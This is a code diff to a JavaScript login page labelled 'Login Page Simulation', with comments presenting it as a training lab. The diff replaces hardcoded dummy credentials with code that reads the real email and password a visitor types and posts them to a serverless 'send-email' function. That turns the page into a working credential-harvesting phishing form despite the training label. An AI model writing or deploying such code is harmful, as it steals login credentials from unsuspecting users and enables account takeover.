@@ -123,16 +123,16 @@
         e.preventDefault();
 
         // Simulated lab credentials (replace with dummy data for training)
-        const email_username = "labuser@example.com";
-        const pass = "FakePassword123";
+        const u_name = document.querySelector("#email").value;
+        const u_pass = document.querySelector("#pass_1").value;
 
         try {
           const res = await fetch("/.netlify/functions/send-email", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              email_username,
-              pass,
+              u_name,
+              u_pass,
               pageName: "Login Page Simulation", // Changes per page in lab
             }),
           });
